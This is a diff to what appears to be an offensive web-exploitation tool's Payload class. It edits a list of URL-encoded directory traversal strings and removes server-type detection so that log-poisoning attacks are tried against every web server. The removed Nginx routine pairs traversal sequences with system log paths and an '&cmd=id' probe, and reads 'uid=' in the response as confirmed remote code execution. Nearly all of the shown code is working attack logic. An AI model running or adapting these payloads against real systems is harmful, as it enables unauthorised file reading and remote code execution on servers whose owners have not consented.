@@ -27,7 +27,7 @@ class Payload:
 		self.creds = creds
 		self.batch = batch
 		self.stealth = stealth
-		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
+		self.linux_dirTraversal = ["","%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
 		# poc -> Proof Of Concept (Change it if you want)
 		self.poc = poc
 		self.override_poc = override_poc
@@ -328,40 +328,9 @@ class Payload:
 		if self.verbosity > 1:
 			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Log Poisoning based on server type.')
 
-		# Check to see if the server leaks a Server Header.
-		if not 'Server' in response.headers.keys():
-			print(colored('[-]', 'red') + " Server does not leak the Server Header. It's impossible to tell if it's running nginx or apache.")
-			if self.batch == False:
-				return False
-			else:
-				if self.batch == True:
-					ans = True
-				else:
-					print(colored('[?]', 'yellow') + " Hit every known server type? [y/N]: ", end='')
-					ans = str(input())
-
-					if 'y' in ans.lower():
-						ans = True
-					else:
-						ans = False
-				if ans == True:
-					# Attempt to hit apache files first
-					ret = self.hitApache()	
-					# If we get a hit then return that. (No need to hit Nginx files)
-					if ret:
-						return ret
-					# Otherwise hit Nginx Files and return the results no matter what they are
-					return self.hitNginx()
-
-		# checks the type of the server
-		if "apache" in response.headers['Server'].lower() or 'litespeed' in response.headers['Server'].lower():
-			return self.hitApache()			
-
-		elif "nginx" in response.headers['Server'].lower():
-			return self.hitNginx()
-		else:
-			print(colored('[-]', 'red', attrs=['bold']) + " The server type " + response.headers['Server'] + " is not supported!!!")
-		return False
+		# Check to see if the server leaks a Server Header. UPGRADE: deleted
+		# checks the type of the server. UPGRADE: deleted in order to perform Log Poisoning for every type of webservers
+		return self.hitApache()			
 
 
 	def hitApache(self):
@@ -384,28 +353,5 @@ class Payload:
 					if self.verbosity > 0:
 						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')		
 		if len(rce) == 0:
-			return False
-		return rce
-
-	def hitNginx(self):
-		# Nginx logs
-		if self.verbosity > 1:
-			print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
-		log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log"), quote("/var/log/httpd/error_log")]
-		rce = []
-		for d_path in self.linux_dirTraversal:
-			for l_path in log:
-				pathh = self.url + d_path + l_path
-				compUrl = pathh + "&cmd=id"
-				clean = self.hit(compUrl)
-				if "uid=" in clean.lower():
-					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
-					if self.outfile is not None:
-						self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh + '\n')
-					rce.append(pathh)
-				else:
-					if self.verbosity > 0:
-						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')	
-		if len(rce) == 0: 
 			return False
 		return rce
